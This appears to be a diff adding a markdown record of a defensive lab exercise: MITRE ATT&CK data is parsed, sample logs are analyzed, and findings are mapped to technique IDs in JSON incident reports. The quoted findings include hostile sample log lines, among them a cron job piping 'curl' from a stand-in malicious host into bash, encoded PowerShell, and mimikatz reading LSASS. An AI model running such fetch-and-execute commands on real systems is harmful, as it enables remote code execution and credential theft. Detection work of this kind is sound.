@@ -1,0 +1,73 @@
+## Directory Structure Creation
+
+.
+├── data
+├── logs
+├── reports
+└── scripts
+
+## MITRE ATT&CK JSON Download
+
+Saving to: ‘data/enterprise-attack.json’
+enterprise-attack.json     100%[==================>] 19.8MB
+
+## Python Dependencies Installation
+
+Successfully installed requests pandas stix2 pyyaml
+
+## MITRE Parser Test Output
+
+Loaded 193 techniques
+Loaded 14 tactics
+
+## Log Analyzer Execution
+
+analysis_report.json
+
+## View Results Output
+
+Total Findings: 7
+[T1059.001] PowerShell -> 2024-01-15 10:30:15 EventID:4688 Process:powershell.exe CommandLine:"powershell -enc SQBuAHYAbwBrAGUA"
+[T1003.001] LSASS Memory -> 2024-01-15 10:32:10 EventID:4663 Object:C:\Windows\System32\lsass.exe Access:Read Process:mimikatz.exe
+[T1543.003] Create or Modify System Process -> Jan 15 10:33:45 server systemd[1]: Started suspicious-service.service
+[T1071.001] Web Protocols -> 2024-01-15 10:32:10 HTTP GET /payload.exe User-Agent: PowerShell
+[T1046] Network Service Scanning -> 2024-01-15 10:30:15 TCP 192.168.1.100:1234 -> 10.0.0.5:445 SMB connection
+[T1046] Network Service Scanning -> 2024-01-15 10:34:12 EventID:5156 Protocol:TCP Source:192.168.1.100 Dest:10.0.0.5 Port:445
+[T1071.001] Web Protocols -> Jan 15 10:32:10 server cron[9876]: (root) CMD (curl http://malicious.com/beacon | bash)
+
+## Generated Reports Directory
+
+analysis_report.json
+incident_report.json
+
+## Auto Mapper Execution
+
+incident_report.json created successfully
+
+## Incident Report Verification (Excerpt)
+
+{
+  "incident": "Sample Incident",
+  "techniques": [
+    {
+      "id": "T1059.001",
+      "name": "PowerShell",
+      "platforms": ["Windows"]
+    },
+    {
+      "id": "T1003.001",
+      "name": "LSASS Memory",
+      "platforms": ["Windows"]
+    }
+  ]
+}
+
+## Final Verification Checklist
+
+✔ MITRE ATT&CK JSON parsed successfully
+✔ 193 techniques loaded
+✔ 14 tactics loaded
+✔ 7 suspicious log findings detected
+✔ ATT&CK techniques mapped correctly
+✔ Structured JSON reports generated
+✔ Incident report successfully created
